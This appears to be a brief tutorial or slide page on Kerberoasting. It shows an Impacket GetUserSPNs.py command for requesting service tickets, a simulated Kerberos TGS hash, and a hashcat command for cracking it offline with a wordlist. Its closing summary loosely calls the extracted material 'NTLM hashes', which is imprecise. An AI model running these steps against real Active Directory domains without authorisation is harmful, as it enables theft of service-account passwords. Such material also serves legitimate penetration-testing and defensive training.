Performing Kerberoasting and Hash Cracking

Tools like Impacket's GetUserSPNs.py extract Kerberos service tickets, which are then cracked offline using hashcat to reveal plaintext passwords.

GetUserSPNs.py -request -dc-ip 192.168.1.10 -outputfile hashes.txt yourdomain.local/youruser:yourpassword
Extracting Hashes

The GetUserSPNs.py script requests service tickets for SPNs and saves the encrypted hashes to a specified output file.

Offline Cracking with Hashcat

Once extracted, these hashes can be fed into hashcat with a wordlist or brute-force attack to recover the plaintext password.

Simulated Hash Output & Cracking
$krb5tgs$23$*svc_webapp$yourdomain.local*HTTP/webapp.yourdomain.local*...
Hashcat Command Example

hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt (mode 13100 for Kerberos 5 TGS-REP)

Key Takeaway

Kerberoasting involves using tools like Impacket's GetUserSPNs.py to extract service account NTLM hashes from Kerberos tickets, which are then cracked offline with hashcat to obtain plaintext passwords.
